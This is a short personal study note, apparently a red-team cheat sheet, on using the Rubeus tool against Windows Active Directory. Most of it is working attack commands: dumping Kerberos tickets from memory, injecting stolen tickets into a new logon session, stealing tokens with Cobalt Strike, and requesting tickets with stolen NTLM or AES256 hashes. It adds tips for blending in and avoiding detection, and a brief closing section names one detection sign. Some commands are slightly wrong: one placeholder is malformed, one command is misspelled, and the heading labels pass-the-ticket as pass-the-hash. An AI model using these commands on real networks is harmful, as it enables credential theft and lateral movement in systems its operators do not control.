---
tags:
  - tool
  - windows
  - AD
date: 2023-09-1
---
# Rubeus

- Can be used for [[Kerberoasting]]
- `Rubeus.exe triage` will list all the [[Kerberos]] tickets in your current logon session and if elevated, from all logon sessions on the machine.
- `Rubeus.exe dump` command will extract all tickets from memory using WinAPIs, which will not open handles to LSASS.
- You can specify which ticket you want to extract by specifying the `/luid` and `/service` parameters.
# [[Pass The Hash]] with Rubeus

- Start a new hidden process: `Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe`
	- The following will make it slightly harder to detect as the username and password will not be randomized: `Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:jonathan.int /username:bfarmer /password:password123!`
- Pass the TGT into the new LUID using the `ptt` command where `/luid` is the LUID just created and `/ticket` is the base64 encoded ticket.
- Run `rubeus.exe dump` and copy the base64 encoded ticket.
- Run `rubeus.exe ptt /luid:<previously_created_luid /ticket:<base64ticket>`.
- Finally, using [[Cobalt Strike]], steal the token of the previously spawned service using `ps` to find the process id and `steal_token <pid>`.
# [[Overpass the Hash]] with Rubeus

- Request a [[Kerberos]] TGT for a user using their [[NTLM]] or AES hash. Elevated privileges are required to obtain a user hash, but not to request a ticket: `Rubeus.exe asktgt /user:jonathan /ntlm:50fc0f884922b4ce34c71e22c /nowrap`
- This ticket can be used with [[Pass the Ticket]].
- A better way to do this is to use the AES256 hash, making it blend in to the environment better: `Rubeus.exe astgt /user:jonathan /aes256:4a8a74daad837ae09e9cc8c2f1b8b934d4bbebade8318ae57c6 /nowrap`.
# Detecting Rubeus

When attempting to pass the hash, Rubeus will use a random username, domain and password which appear in the associated [[Windows Event Logs]] 4624 logon event.